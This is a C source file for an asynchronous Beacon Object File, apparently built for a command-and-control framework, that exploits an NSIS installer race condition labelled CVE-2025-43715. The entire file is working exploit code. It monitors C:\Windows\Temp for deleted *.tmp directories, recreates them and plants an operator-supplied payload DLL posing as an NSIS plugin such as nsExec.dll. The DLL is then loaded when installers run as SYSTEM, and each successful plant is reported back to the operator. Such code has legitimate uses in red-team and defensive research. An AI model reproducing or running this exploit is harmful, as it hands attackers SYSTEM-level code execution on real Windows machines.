/*
 * NSIS race condition async BOF-PE (CVE-2025-43715)
 *
 * Watches C:\ (subtree) for NSIS temp directory deletions under
 * C:\Windows\Temp\*.tmp, matching the C# FileSystemWatcher approach. When
 * NSIS deletes a candidate directory, recreates it and writes the payload DLL
 * before NSIS reuses the path. NSIS installers run by IME as SYSTEM load the
 * planted DLL.
 *
 * Async BOF-PE: uses BeaconGetStopJobEvent() to wait for operator stop,
 * and BeaconWakeup() to push output on each successful plant.
 *
 * Entry point: void go(const char *data, int len)
 *   arg0 (buffer) : payload DLL bytes (uploaded via C2 file selector)
 *   arg1 (string) : NSIS plugin name (default "nsExec.dll")
 *   arg2 (int)    : timeout in seconds (0 = run until stopped)
 */

#include "beacon.h"
#include "bofdefs_pe.h"

/* ----------------------------------------------------------------------------
 * Local definitions
 * -------------------------------------------------------------------------- */
#ifndef FILE_LIST_DIRECTORY
#define FILE_LIST_DIRECTORY 0x0001
#endif

#define WATCH_ROOT    L"C:\\"
#define TARGET_DIR    L"C:\\Windows\\Temp"
#define TEMP_PREFIX   L"Windows\\Temp\\"
#define TEMP_PREFIX_LEN 13  /* wchar count of "Windows\Temp\" */
#define NOTIFY_BUFSZ  65536
#define NOTIFY_FILTER (FILE_NOTIFY_CHANGE_FILE_NAME | FILE_NOTIFY_CHANGE_DIR_NAME)

typedef struct _NOTIFY_INFO {
    DWORD NextEntryOffset;
    DWORD Action;
    DWORD FileNameLength; /* bytes, not characters */
    WCHAR FileName[1];    /* NOT null-terminated */
} NOTIFY_INFO;

/* ----------------------------------------------------------------------------
 * Async stop event helper (C-compatible volatile guard)
 * -------------------------------------------------------------------------- */
static HANDLE get_stop_job_event(void)
{
    HANDLE (*volatile fn)(void) = &BeaconGetStopJobEvent;
    return fn != NULL ? fn() : NULL;
}

/* ----------------------------------------------------------------------------
 * Helpers
 * -------------------------------------------------------------------------- */

static BOOL is_tmp_dir(const wchar_t *name, int len)
{
    if (len < 4)
        return FALSE;
    const wchar_t *p = name + (len - 4);
    return (p[0] == L'.' &&
            (p[1] == L't' || p[1] == L'T') &&
            (p[2] == L'm' || p[2] == L'M') &&
            (p[3] == L'p' || p[3] == L'P'));
}

static BOOL plant_payload(const wchar_t *dirname, int name_chars,
                          const wchar_t *plugin_w,
                          const unsigned char *payload, DWORD payload_len)
{
    wchar_t fname[260];
    wchar_t dirpath[320];
    wchar_t dllpath[600];
    int i;

    if (name_chars <= 0 || name_chars >= 260)
        return FALSE;

    for (i = 0; i < name_chars; i++)
        fname[i] = dirname[i];
    fname[name_chars] = L'\0';

    if (!is_tmp_dir(fname, name_chars))
        return FALSE;

    _snwprintf(dirpath, 320, L"%s\\%s", TARGET_DIR, fname);
    dirpath[319] = L'\0';

    if (!CreateDirectoryW(dirpath, NULL) &&
        GetLastError() != ERROR_ALREADY_EXISTS)
        return FALSE;

    _snwprintf(dllpath, 600, L"%s\\%s", dirpath, plugin_w);
    dllpath[599] = L'\0';

    HANDLE hOut = CreateFileW(dllpath, GENERIC_WRITE, FILE_SHARE_READ, NULL,
                              CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hOut == INVALID_HANDLE_VALUE)
        return FALSE;

    DWORD written = 0;
    DWORD total = 0;
    BOOL ok = TRUE;
    while (total < payload_len) {
        if (!WriteFile(hOut, payload + total, payload_len - total,
                       &written, NULL) || written == 0) {
            ok = FALSE;
            break;
        }
        total += written;
    }

    CloseHandle(hOut);
    return ok && total == payload_len;
}

/* ----------------------------------------------------------------------------
 * Entry point
 * -------------------------------------------------------------------------- */
__declspec(dllexport) void go(const char *data, int len)
{
    BEACON_INIT;

    datap parser;
    BeaconDataParse(&parser, (char *)data, len);
    int   payload_len = 0;
    char *payload_raw = BeaconDataExtract(&parser, &payload_len);
    char *plugin_name = BeaconDataExtract(&parser, NULL);
    int   timeout_sec = BeaconDataInt(&parser);

    if (payload_raw == NULL || payload_len <= 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] No payload DLL provided\n");
        return;
    }
    if (plugin_name == NULL || strlen(plugin_name) == 0)
        plugin_name = "nsExec.dll";
    if (timeout_sec < 0)
        timeout_sec = 0;

    HANDLE stop = get_stop_job_event();
    if (stop == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "[-] race must run as an async BOF\n");
        return;
    }

    /* Copy plugin_name to heap (arg buffer lifetime not guaranteed for async) */
    int pnlen = (int)strlen(plugin_name) + 1;
    char *plugin_copy = (char *)malloc(pnlen);
    if (!plugin_copy) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Out of memory (plugin name)\n");
        return;
    }
    memcpy(plugin_copy, plugin_name, pnlen);

    /* Convert plugin name to wide */
    wchar_t plugin_w[260];
    int pw = MultiByteToWideChar(CP_UTF8, 0, plugin_copy, -1, NULL, 0);
    if (pw <= 0 || pw > 260) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Bad plugin name\n");
        free(plugin_copy);
        return;
    }
    MultiByteToWideChar(CP_UTF8, 0, plugin_copy, -1, plugin_w, pw);

    /* Copy payload into a heap buffer so it outlives the arg parser */
    DWORD fileSize = (DWORD)payload_len;
    unsigned char *payload = (unsigned char *)malloc(fileSize);
    if (payload == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Out of memory (payload %lu bytes)\n", fileSize);
        free(plugin_copy);
        return;
    }
    memcpy(payload, payload_raw, fileSize);

    BeaconPrintf(CALLBACK_OUTPUT,
        "[*] Payload loaded: %lu bytes. Plugin: %s. Timeout: %s.\n",
        fileSize, plugin_copy,
        timeout_sec > 0 ? "specified" : "infinite (stop to end)");
    if (timeout_sec > 0)
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Timeout: %d s\n", timeout_sec);

    /* Open C:\ for subtree monitoring */
    HANDLE hDir = CreateFileW(
        WATCH_ROOT,
        FILE_LIST_DIRECTORY,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        NULL,
        OPEN_EXISTING,
        FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OVERLAPPED,
        NULL);
    if (hDir == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Cannot open %S (err %lu)\n",
                     WATCH_ROOT, GetLastError());
        free(payload);
        free(plugin_copy);
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Opened %S for monitoring (subtree)\n",
                 WATCH_ROOT);

    HANDLE hEvent = CreateEventW(NULL, TRUE, FALSE, NULL);
    if (hEvent == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "[-] CreateEventW failed (err %lu)\n",
                     GetLastError());
        CloseHandle(hDir);
        free(payload);
        free(plugin_copy);
        return;
    }

    OVERLAPPED ovl;
    memset(&ovl, 0, sizeof(ovl));
    ovl.hEvent = hEvent;

    unsigned char *buf = (unsigned char *)malloc(NOTIFY_BUFSZ);
    if (buf == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Out of memory (notify buf)\n");
        CloseHandle(hEvent);
        CloseHandle(hDir);
        free(payload);
        free(plugin_copy);
        return;
    }

    DWORD bytesReturned = 0;
    BOOL armed = ReadDirectoryChangesW(
        hDir, buf, NOTIFY_BUFSZ, TRUE,
        NOTIFY_FILTER,
        &bytesReturned, &ovl, NULL);
    if (!armed) {
        BeaconPrintf(CALLBACK_ERROR, "[-] ReadDirectoryChangesW failed (err %lu)\n",
                     GetLastError());
        free(buf);
        CloseHandle(hEvent);
        CloseHandle(hDir);
        free(payload);
        free(plugin_copy);
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[*] Watching %S for NSIS temp dirs (*.tmp)...\n",
                 TARGET_DIR);

    /* -----------------------------------------------------------------
     * Async wait loop using stop event + notify event.
     * ----------------------------------------------------------------- */
    DWORD start = GetTickCount();
    DWORD limit_ms = (timeout_sec > 0) ? (DWORD)timeout_sec * 1000 : INFINITE;
    int hits = 0;

    HANDLE handles[2] = { hEvent, stop };

    while (1) {
        DWORD remaining_ms;
        if (limit_ms == INFINITE) {
            remaining_ms = INFINITE;
        } else {
            DWORD elapsed = GetTickCount() - start;
            if (elapsed >= limit_ms)
                break;
            remaining_ms = limit_ms - elapsed;
        }

        DWORD wait = WaitForMultipleObjects(2, handles, FALSE, remaining_ms);

        if (wait == WAIT_OBJECT_0 + 1)
            break; /* stop event signaled */

        if (wait == WAIT_TIMEOUT) {
            if (timeout_sec > 0)
                break; /* finite timeout expired */
            continue;
        }

        if (wait != WAIT_OBJECT_0) {
            BeaconPrintf(CALLBACK_ERROR, "[-] Directory wait failed (err %lu)\n",
                         GetLastError());
            break;
        }

        DWORD transferred = 0;
        if (!GetOverlappedResult(hDir, &ovl, &transferred, FALSE)) {
            ResetEvent(hEvent);
            memset(&ovl, 0, sizeof(ovl));
            ovl.hEvent = hEvent;
            if (!ReadDirectoryChangesW(hDir, buf, NOTIFY_BUFSZ, TRUE,
                                       NOTIFY_FILTER,
                                       &bytesReturned, &ovl, NULL))
                break;
            continue;
        }

        if (transferred > 0) {
            unsigned char *cur = buf;
            while (1) {
                NOTIFY_INFO *ni = (NOTIFY_INFO *)cur;
                int name_chars = (int)(ni->FileNameLength / sizeof(WCHAR));
                BOOL try_plant = (ni->Action == FILE_ACTION_REMOVED);

                const wchar_t *fn = ni->FileName;
                int fn_chars = name_chars;
                if (fn_chars > TEMP_PREFIX_LEN &&
                    _wcsnicmp(fn, TEMP_PREFIX, TEMP_PREFIX_LEN) == 0) {
                    fn += TEMP_PREFIX_LEN;
                    fn_chars -= TEMP_PREFIX_LEN;
                } else {
                    try_plant = FALSE;
                }

                if (try_plant) {
                    BOOL planted = plant_payload(fn, fn_chars, plugin_w,
                                                 payload, fileSize);
                    if (planted) {
                        hits++;
                        char nbuf[300];
                        int nb = WideCharToMultiByte(CP_UTF8, 0,
                                     fn, fn_chars,
                                     nbuf, sizeof(nbuf) - 1, NULL, NULL);
                        if (nb < 0) nb = 0;
                        nbuf[nb] = '\0';
                        BeaconPrintf(CALLBACK_OUTPUT,
                            "\n[+] Recreated C:\\Windows\\Temp\\%s and planted %s after deletion",
                            nbuf, plugin_copy);
                        BeaconWakeup();
                    }
                }

                if (ni->NextEntryOffset == 0)
                    break;
                cur += ni->NextEntryOffset;
                if (cur >= buf + NOTIFY_BUFSZ)
                    break;
            }
        }

        /* Re-arm the watch */
        ResetEvent(hEvent);
        memset(&ovl, 0, sizeof(ovl));
        ovl.hEvent = hEvent;
        bytesReturned = 0;
        if (!ReadDirectoryChangesW(hDir, buf, NOTIFY_BUFSZ, TRUE,
                                   NOTIFY_FILTER,
                                   &bytesReturned, &ovl, NULL)) {
            BeaconPrintf(CALLBACK_ERROR, "[-] Re-arm failed (err %lu)\n",
                         GetLastError());
            break;
        }
    }

    /* -----------------------------------------------------------------
     * Cleanup
     * ----------------------------------------------------------------- */
    CancelIo(hDir);
    GetOverlappedResult(hDir, &ovl, &bytesReturned, TRUE);
    CloseHandle(hDir);
    CloseHandle(hEvent);
    free(buf);
    free(payload);
    free(plugin_copy);

    BeaconPrintf(CALLBACK_OUTPUT, "[*] Done. Successful plants: %d\n", hits);
}

BEACON_MAIN("bzi", go)
